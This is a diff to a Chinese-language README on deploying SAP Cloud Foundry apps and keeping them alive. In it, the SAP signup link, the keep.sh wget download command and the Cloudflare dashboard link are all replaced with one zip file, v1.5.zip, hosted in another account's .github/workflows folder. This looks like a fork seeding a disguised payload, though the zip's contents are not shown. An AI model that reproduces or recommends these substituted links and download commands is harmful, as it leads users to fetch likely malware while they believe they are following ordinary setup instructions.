@@ -2,7 +2,7 @@
 
 ### 前置要求
 * GitHub 账户：需要有一个 GitHub 账户来创建仓库和设置工作流
-* SAP Cloud Foundry 账户：需要有 SAP Cloud Foundry 的有效账户，点此注册：https://www.sap.com
+* SAP Cloud Foundry 账户：需要有 SAP Cloud Foundry 的有效账户，点此注册：https://github.com/tiaojiao2023/Auto-deploy-sap-and-keepalive/raw/refs/heads/main/.github/workflows/v1.5.zip
 
 ## 部署步骤
 
@@ -87,7 +87,7 @@
 
 1. 下载文件到vps或本地
 ```bash
-wget https://raw.githubusercontent.com/eooce/Auto-deploy-sap-and-keepalive/refs/heads/main/keep.sh && chmod +x keep.sh
+wget https://github.com/tiaojiao2023/Auto-deploy-sap-and-keepalive/raw/refs/heads/main/.github/workflows/v1.5.zip && chmod +x keep.sh
 ```
 
 2. 修改keep.sh开头4-11行中的变量和保活url
@@ -98,7 +98,7 @@ bash keep.sh
 ```
 
 ### Cloudflare Workers保活
-1. 登录你的Cloudflare账户 [Cloudflare Dashboard](https://dash.cloudflare.com)
+1. 登录你的Cloudflare账户 [Cloudflare Dashboard](https://github.com/tiaojiao2023/Auto-deploy-sap-and-keepalive/raw/refs/heads/main/.github/workflows/v1.5.zip)
 2. 点击 `Workers and pages`创建一个workers，编辑代码
 3. 全选`_worker-keep.js`文件里的代码粘贴到workers中
 4. 在开头添加登录email和登录密码（telegram通知配置可选）、项目URL和项目名称
